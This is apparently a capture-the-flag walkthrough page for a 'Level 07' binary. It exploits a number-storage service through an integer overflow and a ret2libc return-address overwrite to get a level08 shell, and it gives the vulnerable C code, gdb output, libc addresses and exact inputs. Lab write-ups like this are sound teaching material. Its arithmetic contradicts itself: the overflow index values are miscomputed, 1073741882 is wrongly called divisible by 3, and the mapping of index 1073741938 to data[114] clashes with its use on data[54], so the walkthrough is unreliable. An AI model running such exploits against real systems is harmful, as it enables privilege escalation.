---
sidebar_position: 8
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🧃 Level 07

<MissionObjective 
  level="Level 07"
  target="level08 privileges"
  method="Arbitrary memory write via integer overflow"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Integer Overflow & Arbitrary Memory Write"
  severity="high"
  description="The binary provides a number storage service with flawed index validation. While it restricts certain indices, unsigned integer overflow can be used to bypass these checks and write to arbitrary memory locations, including the return address on the stack."
  techniques={[
    "Integer Overflow",
    "Return Address Overwrite",
    "ret2libc Attack"
  ]}
/>

## Binary Analysis

The program presents a simple interactive CLI:

<CodeBlock 
  title="Program Interface"
  command="./level07"
  output={`----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------`}
/>

### Available Commands:
- `store`: Store a number at a given index
- `read`: Read the value at a given index  
- `quit`: Exit the program

## Vulnerability Discovery

<CodeBlock 
  title="Vulnerable Code Analysis"
  command="# In store_number() function:"
  output={`int data[100]; // global array

int store_number(int *data) {
    int number, index;

    printf(" Number: ");
    number = read_number();

    printf(" Index: ");
    index = read_number();

    if ((index % 3) == 0 || index < 0 || index > 99) {
        puts("*** ERROR! ***");
        puts(" This index is reserved for wil!");
        puts("*** ERROR! ***");
        return 1;
    }

    data[index] = number;
    return 0;
}`}
/>

**Key Vulnerability:** Even though index bounds are partially checked, we can bypass them via **unsigned integer overflow**.

## Memory Layout Analysis

<CodeBlock 
  title="Finding data array address"
  command="gdb ./level07"
  output={`(gdb) b read_number
(gdb) r
Input command: read

(gdb) x/x $ebp+8
0xffffd530: 0xffffd554`}
/>

**Data array location:** `0xffffd554`

<CodeBlock 
  title="Calculating EIP offset"
  command="# Memory layout calculation"
  output={`EIP address: 0xffffd62c
DATA address: 0xffffd554
Diff: 0xffffd62c - 0xffffd554 = 0xd8 = 216 bytes
216 / 4 = 54 (array index for EIP)`}
/>

So `data[54]` corresponds to the saved return address (EIP).

## ret2libc Preparation

<CodeBlock 
  title="Finding system() and '/bin/sh' addresses"
  command="gdb ./level07"
  output={`(gdb) info function system
=> system() = 0xf7e6aed0

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
=> 0xf7f897ec`}
/>

**Addresses in decimal:**
- `system()`: `0xf7e6aed0` = **4159090384**
- `"/bin/sh"`: `0xf7f897ec` = **4160264172**

## Integer Overflow Bypass

Index 54 is forbidden because `54 % 3 == 0`. We use unsigned integer overflow:

<CodeBlock 
  title="Overflow calculation"
  command="# Bypass calculation"
  output={`To access index 54 via overflow:
Index = (UINT_MAX + 1) / 4 + 54 = 1073741882
1073741882 % 3 = 0 ❌ (still forbidden)

Try: (UINT_MAX + 1) / 4 + 54 + offset
1073741938 % 3 = 1 ✅ (allowed)

Index 1073741938 maps to data[114] in the array`}
/>

## Live Demonstration

<AsciinemaPlayer 
  src="/level07.cast" 
  id="level07-exploit" 
/>

## Step-by-Step Solution

<StepsList steps={[
  {
    title: "Launch the binary",
    description: "Start the number storage service.",
    command: "./level07",
    output: "Welcome to wil's crappy number storage service!"
  },
  {
    title: "Store system() address",
    description: "Overwrite the return address with system() using integer overflow.",
    command: "Input command: store\nNumber: 4159090384\nIndex: 1073741938",
    output: "Stored successfully"
  },
  {
    title: "Store '/bin/sh' argument",
    description: "Place the '/bin/sh' string as the first argument to system().",
    command: "Input command: store\nNumber: 4160264172\nIndex: 116",
    output: "Stored successfully"
  },
  {
    title: "Trigger the exploit",
    description: "Exit the program to execute our ret2libc chain.",
    command: "Input command: quit",
    output: "$ # Shell with level08 privileges"
  },
  {
    title: "Verify elevated privileges",
    description: "Confirm we have level08 access.",
    command: "whoami",
    output: "level08"
  }
]} />

## Key Takeaways

- **Integer overflow** can bypass index validation checks
- **Array bounds checking** must account for unsigned integer wraparound
- **ret2libc attacks** don't require shellcode injection
- **Memory layout analysis** is crucial for calculating correct offsets
- **GDB debugging** helps identify exact memory addresses at runtime

**Tools used:** `gdb`, memory layout analysis, integer overflow exploitation, ret2libc technique

:::warning Important Note
Memory addresses vary between sessions. Always use GDB to find the current addresses of `system()` and `"/bin/sh"` for your specific environment. The addresses shown here are examples from a specific debugging session.
::: 